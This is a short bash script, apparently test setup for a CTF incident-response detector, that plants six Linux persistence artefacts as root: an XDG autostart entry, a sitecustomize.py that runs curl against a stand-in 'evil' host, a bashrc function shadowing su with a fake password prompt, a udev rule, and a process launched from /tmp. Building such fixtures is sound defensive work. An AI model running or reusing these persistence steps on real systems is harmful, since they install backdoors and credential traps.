#!/bin/bash
# v0.5-R6 闭环验证：6 个遗漏考点逐点构造→识别→fix→验证→还原
mkdir -p /root/.config/autostart /etc/udev/rules.d
# 1. 进程从 /tmp 运行
cp /bin/sleep /tmp/ctfir-tmp-proc && /tmp/ctfir-tmp-proc 300 & TMP_PID=$!
# 2. XDG autostart
printf '[Desktop Entry]\nType=Application\nExec=/tmp/ctfir-evil\n' > /root/.config/autostart/ctfir-marker.desktop
# 3. Python sitecustomize
mkdir -p /usr/lib/python3/site-packages
printf 'import os; os.system("curl http://evil/ctfir")\n' > /usr/lib/python3/site-packages/sitecustomize.py
# 4. bashrc 函数后门
echo 'su() { echo fake_password_prompt; }' >> /root/.bashrc
# 5. Udev rule
printf 'ACTION=="add", RUN+="/tmp/ctfir-udev-evil"\n' > /etc/udev/rules.d/99-ctfir-marker.rules
# 6. XDG autostart 可疑
echo MARKER_DONE
